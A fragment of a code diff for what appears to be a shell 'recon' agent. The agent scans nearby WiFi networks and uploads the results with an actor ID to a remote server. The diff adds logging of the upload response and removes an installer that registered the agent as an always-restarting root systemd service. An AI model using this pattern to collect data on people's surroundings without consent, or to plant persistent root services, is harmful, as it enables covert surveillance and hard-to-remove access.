@@ -206,7 +206,9 @@ perform_recon() {
         if [ ! -z "$WIFIDATA" ]; then
             log "[RECON] WiFi: Found $(echo "$WIFIDATA" | grep -o "ssid" | wc -l) networks, uploading..."
             JSON=$(jq -n --arg aid "$AID" --argjson d "[$WIFIDATA]" '{actorId: $aid, type: "WIFI", data: $d}')
-            curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "$SERVER/api/agent/recon"
+            # Capture output to diagnose upload issues
+            OUT=$(curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "$SERVER/api/agent/recon")
+            log "[RECON] Upload Result: $OUT"
         else
             log "[RECON] WiFi: No networks found."
         fi
@@ -382,28 +384,3 @@ while true; do
 
     sleep 5
 done
-EOF_SRV
-
-chmod +x $AGENT_DIR/agent.sh
-
-cat <<EOF_SVC > /etc/systemd/system/vpp-agent.service
-[Unit]
-Description=VPP Agent
-After=network.target
-
-[Service]
-ExecStart=$AGENT_DIR/agent.sh
-Restart=always
-User=root
-
-[Install]
-WantedBy=multi-user.target
-EOF_SVC
-
-systemctl daemon-reload
-systemctl enable vpp-agent
-systemctl restart vpp-agent
-
-echo "[$(date)] [INSTALLER] Service Installed & Started."
-`;
-};
